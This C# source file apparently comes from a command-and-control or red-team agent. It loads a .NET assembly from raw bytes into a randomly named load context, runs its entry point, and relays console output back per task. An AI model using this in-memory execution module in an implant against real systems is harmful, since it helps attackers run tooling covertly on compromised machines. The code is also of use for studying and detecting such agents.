using System.Reflection;
using System.Runtime.Loader;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;

public class ConsoleApplicationExecutor
{
    private AssemblyLoadContext alc = new AssemblyLoadContext(Misc.RandomString(10));
    private readonly byte[] asmBytes;
    private readonly string[] args;
    private readonly string task_id;
    private readonly IMessageManager messageManager;
    private bool running = false;
    public ConsoleApplicationExecutor(byte[] asmBytes, string[] args, string task_id, IMessageManager messageManager)
    {
        this.messageManager = messageManager;
        this.asmBytes = asmBytes;
        this.args = args;
        this.task_id = task_id;
    }
    public ConsoleApplicationExecutor()
    {

    }
    public void Execute()
    {
        using (var redirector = new ConsoleWriter())
        {
            redirector.WriteEvent += consoleWriter_WriteEvent;
            redirector.WriteLineEvent += consoleWriter_WriteLineEvent;
            running = true;
            // Load the assembly
            try
            {
                Assembly assembly = alc.LoadFromStream(new MemoryStream(this.asmBytes));
                
                assembly.EntryPoint.Invoke(null, new object[] { this.args });
            }
            catch (Exception e)
            {
                messageManager.WriteLine(e.ToString(), this.task_id, true, "error");
            }
            redirector.WriteEvent -= consoleWriter_WriteEvent;
            redirector.WriteLineEvent -= consoleWriter_WriteLineEvent;
            running = false;
        }
    }

    private void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
    {
        messageManager.WriteLine(e.Value, this.task_id, false);
    }

    private void consoleWriter_WriteEvent(object sender, ConsoleWriterEventArgs e)
    {
        messageManager.Write(e.Value, this.task_id, false);
    }

    public bool IsRunning()
    {
        return running;
    }
}